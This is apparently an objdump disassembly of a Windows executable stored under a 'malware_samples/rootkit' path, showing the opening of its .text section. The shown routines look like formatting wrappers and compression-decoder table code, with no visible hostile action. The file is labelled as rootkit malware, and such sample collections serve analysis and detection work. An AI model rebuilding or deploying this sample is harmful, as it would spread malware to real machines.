
malware_samples/rootkit/562266ccea95bda12dbaa06467fc20f0cee32ed3f4e3905bacf4769f8969269d.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 05 a1 0f 3a 01 	lea    0x13a0fa1(%rip),%rax        # 0x1413a1fa8
   140001007:	c3                   	ret
   140001008:	cc                   	int3
   140001009:	cc                   	int3
   14000100a:	cc                   	int3
   14000100b:	cc                   	int3
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001015:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000101a:	53                   	push   %rbx
   14000101b:	55                   	push   %rbp
   14000101c:	56                   	push   %rsi
   14000101d:	57                   	push   %rdi
   14000101e:	48 83 ec 38          	sub    $0x38,%rsp
   140001022:	49 8b f0             	mov    %r8,%rsi
   140001025:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   14000102a:	48 8b da             	mov    %rdx,%rbx
   14000102d:	48 8b f9             	mov    %rcx,%rdi
   140001030:	e8 cb ff ff ff       	call   0x140001000
   140001035:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   14000103a:	4c 8b ce             	mov    %rsi,%r9
   14000103d:	4c 8b c3             	mov    %rbx,%r8
   140001040:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001047:	00 00 
   140001049:	48 8b d7             	mov    %rdi,%rdx
   14000104c:	48 8b 08             	mov    (%rax),%rcx
   14000104f:	e8 4c 4d 01 00       	call   0x140015da0
   140001054:	85 c0                	test   %eax,%eax
   140001056:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000105b:	0f 48 c1             	cmovs  %ecx,%eax
   14000105e:	48 83 c4 38          	add    $0x38,%rsp
   140001062:	5f                   	pop    %rdi
   140001063:	5e                   	pop    %rsi
   140001064:	5d                   	pop    %rbp
   140001065:	5b                   	pop    %rbx
   140001066:	c3                   	ret
   140001067:	cc                   	int3
   140001068:	cc                   	int3
   140001069:	cc                   	int3
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001075:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000107a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000107f:	53                   	push   %rbx
   140001080:	56                   	push   %rsi
   140001081:	57                   	push   %rdi
   140001082:	48 83 ec 30          	sub    $0x30,%rsp
   140001086:	48 8b fa             	mov    %rdx,%rdi
   140001089:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000108e:	48 8b d9             	mov    %rcx,%rbx
   140001091:	e8 6a ff ff ff       	call   0x140001000
   140001096:	45 33 c9             	xor    %r9d,%r9d
   140001099:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000109e:	4c 8b c7             	mov    %rdi,%r8
   1400010a1:	48 8b d3             	mov    %rbx,%rdx
   1400010a4:	48 8b 08             	mov    (%rax),%rcx
   1400010a7:	e8 7c 49 01 00       	call   0x140015a28
   1400010ac:	48 83 c4 30          	add    $0x30,%rsp
   1400010b0:	5f                   	pop    %rdi
   1400010b1:	5e                   	pop    %rsi
   1400010b2:	5b                   	pop    %rbx
   1400010b3:	c3                   	ret
   1400010b4:	cc                   	int3
   1400010b5:	cc                   	int3
   1400010b6:	cc                   	int3
   1400010b7:	cc                   	int3
   1400010b8:	cc                   	int3
   1400010b9:	cc                   	int3
   1400010ba:	cc                   	int3
   1400010bb:	cc                   	int3
   1400010bc:	cc                   	int3
   1400010bd:	cc                   	int3
   1400010be:	cc                   	int3
   1400010bf:	cc                   	int3
   1400010c0:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400010c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400010ca:	53                   	push   %rbx
   1400010cb:	55                   	push   %rbp
   1400010cc:	56                   	push   %rsi
   1400010cd:	57                   	push   %rdi
   1400010ce:	48 83 ec 38          	sub    $0x38,%rsp
   1400010d2:	49 8b f0             	mov    %r8,%rsi
   1400010d5:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   1400010da:	48 8b da             	mov    %rdx,%rbx
   1400010dd:	48 8b f9             	mov    %rcx,%rdi
   1400010e0:	e8 1b ff ff ff       	call   0x140001000
   1400010e5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400010ea:	4c 8b ce             	mov    %rsi,%r9
   1400010ed:	4c 8b c3             	mov    %rbx,%r8
   1400010f0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400010f7:	00 00 
   1400010f9:	48 8b d7             	mov    %rdi,%rdx
   1400010fc:	48 8b 08             	mov    (%rax),%rcx
   1400010ff:	48 83 c9 02          	or     $0x2,%rcx
   140001103:	e8 44 4a 01 00       	call   0x140015b4c
   140001108:	85 c0                	test   %eax,%eax
   14000110a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000110f:	0f 48 c1             	cmovs  %ecx,%eax
   140001112:	48 83 c4 38          	add    $0x38,%rsp
   140001116:	5f                   	pop    %rdi
   140001117:	5e                   	pop    %rsi
   140001118:	5d                   	pop    %rbp
   140001119:	5b                   	pop    %rbx
   14000111a:	c3                   	ret
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	4c 8b c9             	mov    %rcx,%r9
   140001123:	49 83 f8 01          	cmp    $0x1,%r8
   140001127:	73 18                	jae    0x140001141
   140001129:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000112c:	33 c0                	xor    %eax,%eax
   14000112e:	0f 11 01             	movups %xmm0,(%rcx)
   140001131:	0f 11 41 10          	movups %xmm0,0x10(%rcx)
   140001135:	48 89 41 20          	mov    %rax,0x20(%rcx)
   140001139:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   140001140:	c3                   	ret
   140001141:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140001145:	48 8d 42 08          	lea    0x8(%rdx),%rax
   140001149:	48 89 41 20          	mov    %rax,0x20(%rcx)
   14000114d:	49 83 f8 08          	cmp    $0x8,%r8
   140001151:	72 3c                	jb     0x14000118f
   140001153:	49 8d 40 f8          	lea    -0x8(%r8),%rax
   140001157:	48 03 c2             	add    %rdx,%rax
   14000115a:	48 89 41 10          	mov    %rax,0x10(%rcx)
   14000115e:	48 8b 00             	mov    (%rax),%rax
   140001161:	48 89 01             	mov    %rax,(%rcx)
   140001164:	42 0f b6 44 02 ff    	movzbl -0x1(%rdx,%r8,1),%eax
   14000116a:	84 c0                	test   %al,%al
   14000116c:	74 14                	je     0x140001182
   14000116e:	0f bd c8             	bsr    %eax,%ecx
   140001171:	41 ba 08 00 00 00    	mov    $0x8,%r10d
   140001177:	49 8b c0             	mov    %r8,%rax
   14000117a:	44 2b d1             	sub    %ecx,%r10d
   14000117d:	45 89 51 08          	mov    %r10d,0x8(%r9)
   140001181:	c3                   	ret
   140001182:	33 d2                	xor    %edx,%edx
   140001184:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   14000118b:	89 51 08             	mov    %edx,0x8(%rcx)
   14000118e:	c3                   	ret
   14000118f:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140001193:	49 8d 40 fe          	lea    -0x2(%r8),%rax
   140001197:	0f b6 0a             	movzbl (%rdx),%ecx
   14000119a:	49 89 09             	mov    %rcx,(%r9)
   14000119d:	48 83 f8 05          	cmp    $0x5,%rax
   1400011a1:	77 78                	ja     0x14000121b
   1400011a3:	4c 8d 15 56 ee ff ff 	lea    -0x11aa(%rip),%r10        # 0x140000000
   1400011aa:	41 8b 84 82 60 12 00 	mov    0x1260(%r10,%rax,4),%eax
   1400011b1:	00 
   1400011b2:	49 03 c2             	add    %r10,%rax
   1400011b5:	ff e0                	jmp    *%rax
   1400011b7:	0f b6 42 06          	movzbl 0x6(%rdx),%eax
   1400011bb:	48 c1 e0 30          	shl    $0x30,%rax
   1400011bf:	48 0b c1             	or     %rcx,%rax
   1400011c2:	49 89 01             	mov    %rax,(%r9)
   1400011c5:	eb 03                	jmp    0x1400011ca
   1400011c7:	48 8b c1             	mov    %rcx,%rax
   1400011ca:	0f b6 4a 05          	movzbl 0x5(%rdx),%ecx
   1400011ce:	48 c1 e1 28          	shl    $0x28,%rcx
   1400011d2:	48 0b c8             	or     %rax,%rcx
   1400011d5:	49 89 09             	mov    %rcx,(%r9)
   1400011d8:	0f b6 42 04          	movzbl 0x4(%rdx),%eax
   1400011dc:	48 c1 e0 20          	shl    $0x20,%rax
   1400011e0:	48 0b c1             	or     %rcx,%rax
   1400011e3:	49 89 01             	mov    %rax,(%r9)
   1400011e6:	eb 03                	jmp    0x1400011eb
   1400011e8:	48 8b c1             	mov    %rcx,%rax
   1400011eb:	0f b6 4a 03          	movzbl 0x3(%rdx),%ecx
   1400011ef:	48 c1 e1 18          	shl    $0x18,%rcx
   1400011f3:	48 0b c8             	or     %rax,%rcx
   1400011f6:	49 89 09             	mov    %rcx,(%r9)
   1400011f9:	44 0f b6 52 02       	movzbl 0x2(%rdx),%r10d
   1400011fe:	49 c1 e2 10          	shl    $0x10,%r10
   140001202:	4c 0b d1             	or     %rcx,%r10
   140001205:	4d 89 11             	mov    %r10,(%r9)
   140001208:	eb 03                	jmp    0x14000120d
   14000120a:	4c 8b d1             	mov    %rcx,%r10
   14000120d:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140001211:	48 c1 e0 08          	shl    $0x8,%rax
   140001215:	49 03 c2             	add    %r10,%rax
   140001218:	49 89 01             	mov    %rax,(%r9)
   14000121b:	42 0f b6 44 02 ff    	movzbl -0x1(%rdx,%r8,1),%eax
   140001221:	84 c0                	test   %al,%al
   140001223:	74 2a                	je     0x14000124f
   140001225:	0f bd d0             	bsr    %eax,%edx
   140001228:	42 8d 04 c5 00 00 00 	lea    0x0(,%r8,8),%eax
   14000122f:	00 
   140001230:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001235:	2b ca                	sub    %edx,%ecx
   140001237:	41 ba 40 00 00 00    	mov    $0x40,%r10d
   14000123d:	44 2b d0             	sub    %eax,%r10d
   140001240:	41 89 49 08          	mov    %ecx,0x8(%r9)
   140001244:	44 03 d1             	add    %ecx,%r10d
   140001247:	49 8b c0             	mov    %r8,%rax
   14000124a:	45 89 51 08          	mov    %r10d,0x8(%r9)
   14000124e:	c3                   	ret
   14000124f:	33 d2                	xor    %edx,%edx
   140001251:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140001258:	41 89 51 08          	mov    %edx,0x8(%r9)
   14000125c:	c3                   	ret
   14000125d:	0f 1f 00             	nopl   (%rax)
   140001260:	0a 12                	or     (%rdx),%dl
   140001262:	00 00                	add    %al,(%rax)
   140001264:	f9                   	stc
   140001265:	11 00                	adc    %eax,(%rax)
   140001267:	00 e8                	add    %ch,%al
   140001269:	11 00                	adc    %eax,(%rax)
   14000126b:	00 d8                	add    %bl,%al
   14000126d:	11 00                	adc    %eax,(%rax)
   14000126f:	00 c7                	add    %al,%bh
   140001271:	11 00                	adc    %eax,(%rax)
   140001273:	00 b7 11 00 00 cc    	add    %dh,-0x33ffffef(%rdi)
   140001279:	cc                   	int3
   14000127a:	cc                   	int3
   14000127b:	cc                   	int3
   14000127c:	cc                   	int3
   14000127d:	cc                   	int3
   14000127e:	cc                   	int3
   14000127f:	cc                   	int3
   140001280:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   140001284:	48 8b d1             	mov    %rcx,%rdx
   140001287:	4c 3b 41 20          	cmp    0x20(%rcx),%r8
   14000128b:	73 06                	jae    0x140001293
   14000128d:	b8 03 00 00 00       	mov    $0x3,%eax
   140001292:	c3                   	ret
   140001293:	8b 49 08             	mov    0x8(%rcx),%ecx
   140001296:	8b c1                	mov    %ecx,%eax
   140001298:	83 e1 07             	and    $0x7,%ecx
   14000129b:	48 c1 e8 03          	shr    $0x3,%rax
   14000129f:	4c 2b c0             	sub    %rax,%r8
   1400012a2:	89 4a 08             	mov    %ecx,0x8(%rdx)
   1400012a5:	4c 89 42 10          	mov    %r8,0x10(%rdx)
   1400012a9:	49 8b 00             	mov    (%r8),%rax
   1400012ac:	48 89 02             	mov    %rax,(%rdx)
   1400012af:	33 c0                	xor    %eax,%eax
   1400012b1:	c3                   	ret
   1400012b2:	cc                   	int3
   1400012b3:	cc                   	int3
   1400012b4:	cc                   	int3
   1400012b5:	cc                   	int3
   1400012b6:	cc                   	int3
   1400012b7:	cc                   	int3
   1400012b8:	cc                   	int3
   1400012b9:	cc                   	int3
   1400012ba:	cc                   	int3
   1400012bb:	cc                   	int3
   1400012bc:	cc                   	int3
   1400012bd:	cc                   	int3
   1400012be:	cc                   	int3
   1400012bf:	cc                   	int3
   1400012c0:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   1400012c4:	4c 8b c1             	mov    %rcx,%r8
   1400012c7:	41 83 f9 40          	cmp    $0x40,%r9d
   1400012cb:	76 06                	jbe    0x1400012d3
   1400012cd:	b8 03 00 00 00       	mov    $0x3,%eax
   1400012d2:	c3                   	ret
   1400012d3:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400012d7:	48 3b 51 20          	cmp    0x20(%rcx),%rdx
   1400012db:	72 1f                	jb     0x1400012fc
   1400012dd:	49 8b c1             	mov    %r9,%rax
   1400012e0:	41 83 e1 07          	and    $0x7,%r9d
   1400012e4:	48 c1 e8 03          	shr    $0x3,%rax
   1400012e8:	48 2b d0             	sub    %rax,%rdx
   1400012eb:	44 89 49 08          	mov    %r9d,0x8(%rcx)
   1400012ef:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   1400012f3:	48 8b 02             	mov    (%rdx),%rax
   1400012f6:	48 89 01             	mov    %rax,(%rcx)
   1400012f9:	33 c0                	xor    %eax,%eax
   1400012fb:	c3                   	ret
   1400012fc:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001300:	48 3b d1             	cmp    %rcx,%rdx
   140001303:	75 0a                	jne    0x14000130f
   140001305:	41 83 f9 40          	cmp    $0x40,%r9d
   140001309:	1b c0                	sbb    %eax,%eax
   14000130b:	83 c0 02             	add    $0x2,%eax
   14000130e:	c3                   	ret
   14000130f:	45 8b d1             	mov    %r9d,%r10d
   140001312:	48 8b c2             	mov    %rdx,%rax
   140001315:	41 c1 ea 03          	shr    $0x3,%r10d
   140001319:	49 2b c2             	sub    %r10,%rax
   14000131c:	48 3b c1             	cmp    %rcx,%rax
   14000131f:	73 0d                	jae    0x14000132e
   140001321:	44 8b d2             	mov    %edx,%r10d
   140001324:	b8 01 00 00 00       	mov    $0x1,%eax
   140001329:	44 2b d1             	sub    %ecx,%r10d
   14000132c:	eb 02                	jmp    0x140001330
   14000132e:	33 c0                	xor    %eax,%eax
   140001330:	41 8b ca             	mov    %r10d,%ecx
   140001333:	48 2b d1             	sub    %rcx,%rdx
   140001336:	42 8d 0c d5 00 00 00 	lea    0x0(,%r10,8),%ecx
   14000133d:	00 
   14000133e:	44 2b c9             	sub    %ecx,%r9d
   140001341:	49 89 50 10          	mov    %rdx,0x10(%r8)
   140001345:	45 89 48 08          	mov    %r9d,0x8(%r8)
   140001349:	48 8b 0a             	mov    (%rdx),%rcx
   14000134c:	49 89 08             	mov    %rcx,(%r8)
   14000134f:	c3                   	ret
   140001350:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140001355:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000135a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000135f:	53                   	push   %rbx
   140001360:	55                   	push   %rbp
   140001361:	56                   	push   %rsi
   140001362:	41 54                	push   %r12
   140001364:	41 57                	push   %r15
   140001366:	48 83 ec 20          	sub    $0x20,%rsp
   14000136a:	bd 01 00 00 00       	mov    $0x1,%ebp
   14000136f:	41 8b d8             	mov    %r8d,%ebx
   140001372:	4c 8b f9             	mov    %rcx,%r15
   140001375:	8b c5                	mov    %ebp,%eax
   140001377:	41 8b c9             	mov    %r9d,%ecx
   14000137a:	48 8b f2             	mov    %rdx,%rsi
   14000137d:	48 d3 e0             	shl    %cl,%rax
   140001380:	44 8d 63 01          	lea    0x1(%rbx),%r12d
   140001384:	4a 8d 04 60          	lea    (%rax,%r12,2),%rax
   140001388:	48 83 c0 08          	add    $0x8,%rax
   14000138c:	48 3b 44 24 78       	cmp    0x78(%rsp),%rax
   140001391:	0f 87 a1 02 00 00    	ja     0x140001638
   140001397:	81 fb ff 00 00 00    	cmp    $0xff,%ebx
   14000139d:	0f 87 95 02 00 00    	ja     0x140001638
   1400013a3:	41 83 f9 0c          	cmp    $0xc,%r9d
   1400013a7:	76 13                	jbe    0x1400013bc
   1400013a9:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   1400013b0:	48 83 c4 20          	add    $0x20,%rsp
   1400013b4:	41 5f                	pop    %r15
   1400013b6:	41 5c                	pop    %r12
   1400013b8:	5e                   	pop    %rsi
   1400013b9:	5d                   	pop    %rbp
   1400013ba:	5b                   	pop    %rbx
   1400013bb:	c3                   	ret
   1400013bc:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400013c1:	33 d2                	xor    %edx,%edx
   1400013c3:	4c 89 6c 24 10       	mov    %r13,0x10(%rsp)
   1400013c8:	8b fd                	mov    %ebp,%edi
   1400013ca:	44 8b ed             	mov    %ebp,%r13d
   1400013cd:	4c 89 74 24 08       	mov    %r14,0x8(%rsp)
   1400013d2:	41 d3 e5             	shl    %cl,%r13d
   1400013d5:	4d 8d 77 06          	lea    0x6(%r15),%r14
   1400013d9:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   1400013dd:	44 89 6c 24 60       	mov    %r13d,0x60(%rsp)
   1400013e2:	66 d3 e7             	shl    %cl,%di
   1400013e5:	44 0f b7 dd          	movzwl %bp,%r11d
   1400013e9:	45 8d 55 ff          	lea    -0x1(%r13),%r10d
   1400013ed:	45 8b c2             	mov    %r10d,%r8d
   1400013f0:	45 85 e4             	test   %r12d,%r12d
   1400013f3:	0f 84 c4 01 00 00    	je     0x1400015bd
   1400013f9:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   1400013fe:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   140001404:	0f b7 0c 56          	movzwl (%rsi,%rdx,2),%ecx
   140001408:	66 83 f9 ff          	cmp    $0xffff,%cx
   14000140c:	75 11                	jne    0x14000141f
   14000140e:	41 8b c0             	mov    %r8d,%eax
   140001411:	41 0f b7 ca          	movzwl %r10w,%ecx
   140001415:	41 ff c8             	dec    %r8d
   140001418:	41 88 54 87 06       	mov    %dl,0x6(%r15,%rax,4)
   14000141d:	eb 0e                	jmp    0x14000142d
   14000141f:	33 c0                	xor    %eax,%eax
   140001421:	66 3b cf             	cmp    %di,%cx
   140001424:	66 41 0f 4c c3       	cmovl  %r11w,%ax
   140001429:	44 0f b7 d8          	movzwl %ax,%r11d
   14000142d:	66 89 4c 55 00       	mov    %cx,0x0(%rbp,%rdx,2)
   140001432:	ff c2                	inc    %edx
   140001434:	41 3b d4             	cmp    %r12d,%edx
   140001437:	72 cb                	jb     0x140001404
   140001439:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000143d:	45 8d 55 ff          	lea    -0x1(%r13),%r10d
   140001441:	45 8b cd             	mov    %r13d,%r9d
   140001444:	66 41 89 07          	mov    %ax,(%r15)
   140001448:	41 d1 e9             	shr    $1,%r9d
   14000144b:	41 8b cd             	mov    %r13d,%ecx
   14000144e:	41 83 c1 03          	add    $0x3,%r9d
   140001452:	c1 e9 03             	shr    $0x3,%ecx
   140001455:	44 03 c9             	add    %ecx,%r9d
   140001458:	66 45 89 5f 02       	mov    %r11w,0x2(%r15)
   14000145d:	45 3b c2             	cmp    %r10d,%r8d
   140001460:	0f 85 8d 00 00 00    	jne    0x1400014f3
   140001466:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   14000146b:	4c 8d 04 5d 00 00 00 	lea    0x0(,%rbx,2),%r8
   140001472:	00 
   140001473:	4c 03 c5             	add    %rbp,%r8
   140001476:	41 8b f1             	mov    %r9d,%esi
   140001479:	41 8b e9             	mov    %r9d,%ebp
   14000147c:	33 d2                	xor    %edx,%edx
   14000147e:	45 33 c9             	xor    %r9d,%r9d
   140001481:	41 8b fa             	mov    %r10d,%edi
   140001484:	45 33 db             	xor    %r11d,%r11d
   140001487:	41 bd 08 00 00 00    	mov    $0x8,%r13d
   14000148d:	49 bf 01 01 01 01 01 	movabs $0x101010101010101,%r15
   140001494:	01 01 01 
   140001497:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000149e:	00 00 
   1400014a0:	4b 0f bf 1c 5e       	movswq (%r14,%r11,2),%rbx
   1400014a5:	41 8b cd             	mov    %r13d,%ecx
   1400014a8:	4d 89 4c 10 02       	mov    %r9,0x2(%r8,%rdx,1)
   1400014ad:	66 44 3b eb          	cmp    %bx,%r13w
   1400014b1:	7d 1f                	jge    0x1400014d2
   1400014b3:	0f 1f 40 00          	nopl   0x0(%rax)
   1400014b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400014be:	00 00 
   1400014c0:	48 63 c1             	movslq %ecx,%rax
   1400014c3:	41 03 cd             	add    %r13d,%ecx
   1400014c6:	48 03 c2             	add    %rdx,%rax
   1400014c9:	4d 89 4c 00 02       	mov    %r9,0x2(%r8,%rax,1)
   1400014ce:	3b cb                	cmp    %ebx,%ecx
   1400014d0:	7c ee                	jl     0x1400014c0
   1400014d2:	48 03 d3             	add    %rbx,%rdx
   1400014d5:	41 ff c3             	inc    %r11d
   1400014d8:	4d 03 cf             	add    %r15,%r9
   1400014db:	45 3b dc             	cmp    %r12d,%r11d
   1400014de:	72 c0                	jb     0x1400014a0
   1400014e0:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   1400014e5:	44 8b 6c 24 60       	mov    0x60(%rsp),%r13d
   1400014ea:	4d 8d 77 06          	lea    0x6(%r15),%r14
   1400014ee:	e9 f7 00 00 00       	jmp    0x1400015ea
   1400014f3:	33 c0                	xor    %eax,%eax
   1400014f5:	33 db                	xor    %ebx,%ebx
   1400014f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400014fe:	00 00 
   140001500:	0f bf 14 5e          	movswl (%rsi,%rbx,2),%edx
   140001504:	45 33 db             	xor    %r11d,%r11d
   140001507:	33 c9                	xor    %ecx,%ecx
   140001509:	66 3b ca             	cmp    %dx,%cx
   14000150c:	7d 25                	jge    0x140001533
   14000150e:	66 90                	xchg   %ax,%ax
   140001510:	41 88 1c 86          	mov    %bl,(%r14,%rax,4)
   140001514:	41 03 c1             	add    %r9d,%eax
   140001517:	41 23 c2             	and    %r10d,%eax
   14000151a:	41 3b c0             	cmp    %r8d,%eax
   14000151d:	76 0c                	jbe    0x14000152b
   14000151f:	90                   	nop
   140001520:	41 03 c1             	add    %r9d,%eax
   140001523:	41 23 c2             	and    %r10d,%eax
   140001526:	41 3b c0             	cmp    %r8d,%eax
   140001529:	77 f5                	ja     0x140001520
   14000152b:	41 ff c3             	inc    %r11d
   14000152e:	44 3b da             	cmp    %edx,%r11d
   140001531:	7c dd                	jl     0x140001510
   140001533:	ff c3                	inc    %ebx
   140001535:	41 3b dc             	cmp    %r12d,%ebx
   140001538:	72 c6                	jb     0x140001500
   14000153a:	85 c0                	test   %eax,%eax
   14000153c:	74 22                	je     0x140001560
   14000153e:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140001545:	4c 8b 6c 24 10       	mov    0x10(%rsp),%r13
   14000154a:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   14000154f:	4c 8b 74 24 08       	mov    0x8(%rsp),%r14
   140001554:	48 83 c4 20          	add    $0x20,%rsp
   140001558:	41 5f                	pop    %r15
   14000155a:	41 5c                	pop    %r12
   14000155c:	5e                   	pop    %rsi
   14000155d:	5d                   	pop    %rbp
   14000155e:	5b                   	pop    %rbx
   14000155f:	c3                   	ret
   140001560:	45 33 db             	xor    %r11d,%r11d
   140001563:	45 85 ed             	test   %r13d,%r13d
   140001566:	74 51                	je     0x1400015b9
   140001568:	45 8b d3             	mov    %r11d,%r10d
   14000156b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001570:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140001575:	45 8b ca             	mov    %r10d,%r9d
   140001578:	43 0f b6 0c 8e       	movzbl (%r14,%r9,4),%ecx
   14000157d:	44 0f b7 04 4a       	movzwl (%rdx,%rcx,2),%r8d
   140001582:	41 8d 40 01          	lea    0x1(%r8),%eax
   140001586:	66 89 04 4a          	mov    %ax,(%rdx,%rcx,2)
   14000158a:	41 8b d3             	mov    %r11d,%edx
   14000158d:	41 0f bd c8          	bsr    %r8d,%ecx
   140001591:	0f b6 c1             	movzbl %cl,%eax
   140001594:	0f b6 4c 24 68       	movzbl 0x68(%rsp),%ecx
   140001599:	0f 45 d0             	cmovne %eax,%edx
   14000159c:	2a ca                	sub    %dl,%cl
   14000159e:	41 ff c2             	inc    %r10d
   1400015a1:	66 41 d3 e0          	shl    %cl,%r8w
   1400015a5:	66 45 2b c5          	sub    %r13w,%r8w
   1400015a9:	43 88 4c 8f 07       	mov    %cl,0x7(%r15,%r9,4)
   1400015ae:	66 47 89 44 8f 04    	mov    %r8w,0x4(%r15,%r9,4)
   1400015b4:	45 3b d5             	cmp    %r13d,%r10d
   1400015b7:	72 b7                	jb     0x140001570
   1400015b9:	33 c0                	xor    %eax,%eax
   1400015bb:	eb 88                	jmp    0x140001545
   1400015bd:	41 8b c5             	mov    %r13d,%eax
   1400015c0:	66 41 89 6f 02       	mov    %bp,0x2(%r15)
   1400015c5:	c1 e8 03             	shr    $0x3,%eax
   1400015c8:	4c 8d 04 5d 00 00 00 	lea    0x0(,%rbx,2),%r8
   1400015cf:	00 
   1400015d0:	83 c0 03             	add    $0x3,%eax
   1400015d3:	66 45 89 0f          	mov    %r9w,(%r15)
   1400015d7:	41 8b cd             	mov    %r13d,%ecx
   1400015da:	41 8b fa             	mov    %r10d,%edi
   1400015dd:	d1 e9                	shr    $1,%ecx
   1400015df:	03 c1                	add    %ecx,%eax
   1400015e1:	4c 03 44 24 70       	add    0x70(%rsp),%r8
   1400015e6:	8b f0                	mov    %eax,%esi
   1400015e8:	8b e8                	mov    %eax,%ebp
   1400015ea:	45 33 db             	xor    %r11d,%r11d
   1400015ed:	45 8b d5             	mov    %r13d,%r10d
   1400015f0:	41 8b d3             	mov    %r11d,%edx
   1400015f3:	45 8b cb             	mov    %r11d,%r9d
   1400015f6:	45 85 ed             	test   %r13d,%r13d
   1400015f9:	74 be                	je     0x1400015b9
   1400015fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001600:	43 0f b6 44 08 02    	movzbl 0x2(%r8,%r9,1),%eax
   140001606:	48 8b ca             	mov    %rdx,%rcx
   140001609:	48 23 cf             	and    %rdi,%rcx
   14000160c:	41 88 44 8f 06       	mov    %al,0x6(%r15,%rcx,4)
   140001611:	48 8d 0c 16          	lea    (%rsi,%rdx,1),%rcx
   140001615:	43 0f b6 44 08 03    	movzbl 0x3(%r8,%r9,1),%eax
   14000161b:	48 8d 14 6a          	lea    (%rdx,%rbp,2),%rdx
   14000161f:	48 23 cf             	and    %rdi,%rcx
   140001622:	48 23 d7             	and    %rdi,%rdx
   140001625:	49 83 c1 02          	add    $0x2,%r9
   140001629:	41 88 44 8f 06       	mov    %al,0x6(%r15,%rcx,4)
   14000162e:	4d 3b ca             	cmp    %r10,%r9
   140001631:	72 cd                	jb     0x140001600
   140001633:	e9 30 ff ff ff       	jmp    0x140001568
   140001638:	48 c7 c0 d2 ff ff ff 	mov    $0xffffffffffffffd2,%rax
   14000163f:	48 83 c4 20          	add    $0x20,%rsp
   140001643:	41 5f                	pop    %r15
   140001645:	41 5c                	pop    %r12
   140001647:	5e                   	pop    %rsi
   140001648:	5d                   	pop    %rbp
   140001649:	5b                   	pop    %rbx
   14000164a:	c3                   	ret
   14000164b:	cc                   	int3
   14000164c:	cc                   	int3
   14000164d:	cc                   	int3
   14000164e:	cc                   	int3
   14000164f:	cc                   	int3
   140001650:	40 53                	rex push %rbx
   140001652:	55                   	push   %rbp
   140001653:	56                   	push   %rsi
   140001654:	57                   	push   %rdi
   140001655:	41 57                	push   %r15
   140001657:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   14000165e:	48 8b 05 9b 69 37 01 	mov    0x137699b(%rip),%rax        # 0x141378000
   140001665:	48 33 c4             	xor    %rsp,%rax
   140001668:	48 89 84 24 80 02 00 	mov    %rax,0x280(%rsp)
   14000166f:	00 
   140001670:	48 8b 9c 24 f8 02 00 	mov    0x2f8(%rsp),%rbx
   140001677:	00 
   140001678:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   14000167d:	49 8b f9             	mov    %r9,%rdi
   140001680:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001685:	4d 8b c8             	mov    %r8,%r9
   140001688:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000168d:	49 8b e8             	mov    %r8,%rbp
   140001690:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001695:	4c 8b f9             	mov    %rcx,%r15
